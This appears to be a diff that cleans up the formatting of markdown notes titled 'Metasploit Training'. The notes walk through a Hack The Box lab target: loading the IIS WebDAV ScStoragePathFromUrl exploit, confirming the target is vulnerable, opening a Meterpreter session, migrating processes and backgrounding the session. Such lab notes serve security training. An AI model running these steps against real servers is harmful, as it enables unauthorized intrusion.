@@ -1,8 +1,8 @@
-## Metasploit Training
+### Metasploit Training
 ```shell
 msf > use exploit/windows/iis/iis_webdav_scstoragepathfromurl 
 ```
-**Confirm target
+**Confirm target**
 ```shell
 msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check
 [+] 10.10.10.14:80 The target is vulnerable.
@@ -19,7 +19,7 @@ Domain          : HTB
 Logged On Users : 2
 Meterpreter     : x86/windows
 ```
-**Mirgrate "Better exe"
+**Mirgrate "More powerful process"**
 ```shell
 meterpreter > ps
 --------
@@ -30,7 +30,7 @@ meterpreter > migrate 1800
 [*] Migrating from 2776 to 1800...
 [*] Migration completed successfully.
 ```
-**Select exploit
+**Select exploit**
 ```shell
 meterpreter > background
 [*] Backgrounding session 1...
